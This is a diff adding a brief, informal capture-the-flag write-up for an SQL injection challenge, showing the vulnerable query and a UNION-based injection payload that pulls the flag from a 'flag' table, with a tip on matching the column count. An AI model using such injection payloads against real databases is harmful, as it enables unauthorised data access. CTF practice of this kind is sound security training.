@@ -1,0 +1,17 @@
+1st of all we need 2 understand what sort of request is there:
+Query: SELECT * FROM age WHERE age=
+
+Task:
+
+Find out how many years you have left to live
+Flag is in flag table.
+
+All is pretty ez. 
+If you still cant do something like this just look my another rep:
+https://github.com/PragmaEdragon/forkomb-sql_injections
+
+Request:
+SELECT * FROM age WHERE age=228 union select flag,2,3 from flag
+
+flag,2,3 because num of columns.
+----------------------------------------------------------------
